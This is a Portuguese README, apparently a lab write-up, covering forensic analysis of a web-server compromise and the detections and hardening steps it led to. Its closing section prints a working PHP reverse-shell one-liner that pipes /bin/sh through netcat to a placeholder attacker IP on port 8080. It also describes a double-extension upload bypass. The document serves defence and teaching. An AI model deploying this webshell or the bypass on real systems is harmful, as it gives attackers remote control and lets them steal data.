# WebStrike — Network Forensics & Detections  
**Autor:** Ricardo Almeida · **GitHub:** @The-Black-Needles · **Data:** 29/09/2025

## Contexto
Recebi um **PCAP** (tráfego capturado) do **servidor web** da empresa. Meu objetivo foi **confirmar um possível comprometimento**, entender **como** aconteceu e produzir **evidências, detecções e recomendações** acionáveis.

## Como conduzi a investigação (meu raciocínio)
1) **Mapeei os hosts e fluxos** no PCAP (Wireshark → *Statistics > Endpoints*).
2) **Contextualizei a origem** com **GeoIP** do IP externo suspeito.
3) **Busquei POST multipart** (upload) e indícios de **dupla extensão** em `filename=`; observei uma primeira tentativa falha e uma segunda bem-sucedida com `*.jpg.php` (exemplo genérico).
4) **Inspecionei o script** para confirmar **reverse shell** e **conexão de saída**.
5) **Procurei exfiltração** (picos de bytes **HTTP/HTTPS**) e padrões de automação.
6) **Consolidei evidências** em **timeline**; criei **regras Sigma/KQL** e **relatórios** técnico/executivo com recomendações.

## Principais achados (generalizados)
- **Entrada:** *Upload* malicioso via **dupla extensão** (`.jpg.php`) contornando validação.
- **Pós-exploração:** **Reverse shell** com **conexão de saída :8080** para IP externo.
- **Exfiltração:** **POST** em **443** com volume anômalo sugerindo envio de dados sensíveis.

## Recomendações objetivas (24–72h)
- **Bloquear IoCs** e saídas **:8080** não justificadas.
- **WAF/validação de upload:** negar **dupla extensão** e inspecionar `multipart`.
- **No-exec em `/uploads`** (impedir execução de scripts em diretórios de mídia).
- Reforçar **monitoramento/detecções** (Sigma/KQL) e perfis de **volume** em 443.

---

## Objetivos de investigação 

<summary><b>O1 — Origem do tráfego suspeito (GeoIP)</b></summary>

**De onde partiu a atividade maliciosa?  
**O que fiz:** levantei *top talkers* (Wireshark → Endpoints) e consultei **GeoIP** do IP externo.  
**Por que importa:** apoia *geo-blocking*, triagem de *threat intel* e contexto de risco.  
**Artefatos:** [`endpoints.txt`](20-network-analysis/tshark-commands.md) • [`timeline.md`](20-network-analysis/timeline.md)  

<summary><b>O2 — Identificação do agente cliente (User-Agent)</b></summary>

**Qual *User-Agent* foi usado na interação inicial?  
**O que fiz:** reconstruí **HTTP Stream** e inspecionei cabeçalhos; comparei com perfis legítimos.  
**Por que importa:** ajuda a criar **regras de filtragem** e detectar *tooling* disfarçado.  
**Artefatos:** [`wireshark-filters.md`](20-network-analysis/wireshark-filters.md) • `report-technical.md`  

<summary><b>O3 — Mecanismo de entrada (upload malicioso)</b></summary>

**Houve **upload de script** e como passou pela validação?  
**O que fiz:** filtrei `HTTP POST` multipart, busquei `filename=` e indícios de **dupla extensão**; confirmei sucesso do upload.  
**Por que importa:** evidencia **bypass de validação** e define **controles WAF**/hardening.  
**Artefatos:** [`web_upload_double_extension.yml`](30-detections/sigma/web_upload_double_extension.yml) • [`post_uploads.tsv`](20-network-analysis/tshark-commands.md)  
**Exemplo genérico:** `*.jpg.php` (exemplo **genérico**, não a resposta do lab).  

<summary><b>O4 — Local de armazenamento de uploads</b></summary>

**Onde o aplicativo armazena os arquivos enviados?  
**O que fiz:** segui **redirects** (HTTP 3xx) e navegação pós-upload para inferir o diretório.  
**Por que importa:** permite **remediação** (limpeza) e **no-exec** no diretório de mídia.  
**Artefatos:** [`timeline.md`](20-network-analysis/timeline.md) • `report-technical.md`  

<summary><b>O5 — Canal de comando e controle (reverse shell)</b></summary>

**Há **conexão de saída** para C2? qual **porta**?  
**O que fiz:** procurei padrões de **reverse shell** e conexões **outbound** atípicas; destaque para porta alta.  
**Por que importa:** base para **Egress Control** e detecção comportamental.  
**Artefatos:** [`reverse_shell_port_8080.kql`](30-detections/kql/reverse_shell_port_8080.kql) • `revshell.tsv`  

<summary><b>O6 — Tentativa de exfiltração</b></summary>

**Houve **envio de dados sensíveis** via HTTP/HTTPS?  
**O que fiz:** busquei **POST/PUT** com **alto volume** e padrões de `curl`/automação; sinalizei artefatos sensíveis (ex.: `/etc/passwd` como **exemplo genérico**).  
**Por que importa:** prioriza **resposta a incidentes** e criação de **regras de exfil**.  
**Artefatos:** [`web_exfil_high_volume.kql`](30-detections/kql/web_exfil_high_volume.kql) • `http_posts.tsv`  

---

## Como replicar (dados sintéticos)
Os artefatos abaixo incluem **consultas**, **regras** e **amostras sintéticas** para reproduzir consultas e visualizar o método, **sem** expor dados do laboratório.

- `20-network-analysis/` — filtros/extrações e timeline
- `30-detections/` — Sigma & KQL
- `50-reports/` — relatórios (técnico + executivo)

> **Licença:** MIT (apenas para o meu conteúdo autoral).  
> **Atribuição:** cenário inspirado no WebStrike Lab (link oficial na seção *references*).

---

## Análise do webshell (padrão de reverse shell — generalizado, sem spoilers)

Durante a inspeção do artefato de upload (webshell), identifiquei um **padrão clássico de reverse shell** em PHP
que orquestra FIFO em `/tmp` e inicia um shell interativo encaminhado via `nc` (*netcat*) para um **IP externo** e **porta alta**.

> **Snippet generalizado (placeholder):**
```php
<?php
system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8080 >/tmp/f");
?>
```

- O comando `nc` indica **conexão de saída** para o **controlador** (C2).  
- A **porta-alvo** (no exemplo: **8080**) é um indicativo útil para **Egress Control** e detecção comportamental.
- Para fins de **ética/no-spoilers**, o endereço IP real foi substituído por `<ATTACKER_IP>`.

**Detecções relacionadas**
- [`reverse_shell_port_8080.kql`](30-detections/kql/reverse_shell_port_8080.kql) — monitoramento de conexões de saída para 8080.
- [`reverse_shell_nc_command.yml`](30-detections/sigma/reverse_shell_nc_command.yml) — detecção de *payloads* de upload contendo sequência de **FIFO + /bin/sh + nc** (quando o *logsource* captura corpo da requisição).
